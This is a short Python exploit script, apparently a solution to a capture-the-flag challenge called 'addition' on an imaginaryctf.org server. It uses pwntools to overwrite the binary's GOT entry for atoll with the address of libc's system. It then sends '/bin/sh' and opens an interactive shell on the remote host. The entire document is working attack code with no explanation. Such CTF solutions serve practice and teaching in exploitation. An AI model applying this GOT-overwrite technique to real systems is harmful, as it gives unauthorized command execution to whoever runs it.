REMOTE = True

from pwn import *

context.binary = vuln = ELF('./vuln')

if REMOTE:
	p = remote('addition.chal.imaginaryctf.org', 1337)
	libc = ELF('libc.so.6')
else:
	p = process('./vuln')
	libc_path = next(path for path in p.libs().keys() if 'libc' in path)
	libc = ELF(libc_path, checksec=False)

buf_to_atollplt = vuln.got.atoll - vuln.symbols.buf
atoll_to_system = libc.symbols.system - libc.symbols.atoll 

p.writeline(f'{buf_to_atollplt}'.encode())
p.writeline(f'{atoll_to_system}'.encode())
p.writeline(b'/bin/sh')

p.interactive()